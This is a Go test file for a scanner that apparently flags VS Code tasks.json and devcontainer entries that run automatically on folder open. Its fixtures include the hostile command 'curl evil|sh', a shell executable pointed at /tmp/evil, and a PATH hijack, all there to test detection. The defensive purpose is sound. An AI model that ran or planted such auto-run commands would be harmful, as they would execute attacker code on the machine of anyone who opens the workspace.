package autorun

import (
	"context"
	"errors"
	"fmt"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/iimmuunnee/ai-defense-kit/internal/checker"
)

const folderOpen = `"runOptions":{"runOn":"folderOpen"}`

func TestTaskEvidenceShowsOSBlocksAndOptions(t *testing.T) {
	cases := []struct{ name, tasks, want string }{
		{"os block with only args",
			`{"tasks":[{"label":"a","command":"bash","args":["-c","echo ok"],"linux":{"args":["-c","curl evil|sh"]},` + folderOpen + `}]}`,
			`a: {"command":"bash","args":["-c","echo ok"],"linux":{"args":["-c","curl evil|sh"]},"label":"a",` + folderOpen + `}`},
		{"shell args without executable",
			`{"tasks":[{"label":"a","command":"echo","options":{"shell":{"args":["-c"]}},` + folderOpen + `}]}`,
			`a: {"command":"echo","label":"a","options":{"shell":{"args":["-c"]}},` + folderOpen + `}`},
		{"top-level options.shell",
			`{"options":{"shell":{"executable":"/tmp/evil"}},"tasks":[{"label":"a","command":"echo",` + folderOpen + `}]}`,
			`a: {"command":"echo","label":"a",` + folderOpen + `}; 전역: {"options":{"shell":{"executable":"/tmp/evil"}}}`},
		{"top-level os block options.shell",
			`{"linux":{"options":{"shell":{"executable":"/tmp/evil"}}},"tasks":[{"label":"a","command":"echo",` + folderOpen + `}]}`,
			`a: {"command":"echo","label":"a",` + folderOpen + `}; 전역: {"linux":{"options":{"shell":{"executable":"/tmp/evil"}}}}`},
		{"task os block options.shell",
			`{"tasks":[{"label":"a","command":"echo","linux":{"options":{"shell":{"executable":"/tmp/evil"}}},` + folderOpen + `}]}`,
			`a: {"command":"echo","linux":{"options":{"shell":{"executable":"/tmp/evil"}}},"label":"a",` + folderOpen + `}`},
		{"options env and cwd",
			`{"tasks":[{"label":"a","command":"echo","options":{"env":{"PATH":"/tmp/evil","B":"c"},"cwd":"/tmp/x"},` + folderOpen + `}]}`,
			`a: {"command":"echo","label":"a","options":{"cwd":"/tmp/x","env":{"B":"c","PATH":"/tmp/evil"}},` + folderOpen + `}`},
		{"options env secret is masked",
			`{"tasks":[{"label":"a","command":"echo","options":{"env":{"API_TOKEN":"abcd"}},` + folderOpen + `}]}`,
			`a: {"command":"echo","label":"a","options":{"env":{"API_TOKEN":"****"}},` + folderOpen + `}`},
		{"task is the object that holds runOptions",
			`{"label":"x","tasks":[{"command":"curl evil|sh",` + folderOpen + `}]}`,
			`1: {"command":"curl evil|sh",` + folderOpen + `}`},
		{"dependsOn shows its labels and nothing is resolved",
			`{"tasks":[{"label":"a","dependsOn":["b","zz"],` + folderOpen + `},{"label":"b","command":"decoy"}]}`,
			`a: {"dependsOn":["b","zz"],"label":"a",` + folderOpen + `}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			root := t.TempDir()
			write(t, root, ".vscode/tasks.json", c.tasks)
			expectFindings(t, root, "AR-001|high|certain|.vscode/tasks.json|0|"+c.want)
		})
	}
}

func chainTasks(n int) string {
	var b strings.Builder
	b.WriteString(`{"tasks":[`)
	for i := 0; i < n; i++ {
		if i > 0 {
			b.WriteByte(',')
		}
		fmt.Fprintf(&b, `{"label":"t%d","command":"echo %d","dependsOn":"t%d",%s}`, i, i, i+1, folderOpen)
	}
	b.WriteString(`]}`)
	return b.String()
}

func TestLargeTaskChainFinishesQuickly(t *testing.T) {
	body := chainTasks(9000)
	if len(body) < 1<<19 || len(body) > 1<<20 {
		t.Fatalf("test input is %d bytes", len(body))
	}
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", body)
	start := time.Now()
	res := run(t, root)
	if d := time.Since(start); d > stallLimit {
		t.Errorf("took %v", d)
	}
	if len(res.Findings) != 201 { // 200 and the notice about the rest
		t.Errorf("findings = %d", len(res.Findings))
	}
}

func TestCancelledContextReturnsPromptly(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".vscode/tasks.json", chainTasks(9000))
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	start := time.Now()
	_, err := New(testData).Run(ctx, checker.Target{Root: root})
	if !errors.Is(err, context.Canceled) || time.Since(start) > cancelLimit {
		t.Errorf("err = %v after %v", err, time.Since(start))
	}
}

func TestDevcontainerExemptionIsNarrow(t *testing.T) {
	root := t.TempDir()
	write(t, root, ".devcontainer/node_modules/dep/package.json", `{"scripts":{"postinstall":"x"}}`)
	write(t, root, ".devcontainer/dist/package.json", `{"scripts":{"postinstall":"x"}}`)
	write(t, root, ".devcontainer/dist/.vscode/tasks.json", `{"tasks":[{"label":"a","command":"c",`+folderOpen+`}]}`)
	write(t, root, ".devcontainer/dist/devcontainer.json", `{"postStartCommand":"echo d"}`)
	expectFindings(t, root, "AR-003|medium|suspect|.devcontainer/dist/devcontainer.json|0|postStartCommand: echo d")

	// A scan root that is itself called .devcontainer gets no exemption.
	outer := t.TempDir()
	dc := filepath.Join(outer, ".devcontainer")
	write(t, dc, "node_modules/package.json", `{"scripts":{"postinstall":"x"}}`)
	write(t, dc, "dist/devcontainer.json", `{"postStartCommand":"echo d"}`)
	res := run(t, dc)
	if len(res.Findings) != 0 {
		t.Errorf("findings under a root named .devcontainer: %+v", res.Findings)
	}
}

func TestLocationIsNotCut(t *testing.T) {
	long := strings.Repeat("d", 400)
	if got := locationText(long + "/a\x1b.json"); got != long+"/a.json" {
		t.Errorf("location = %q", got)
	}
}
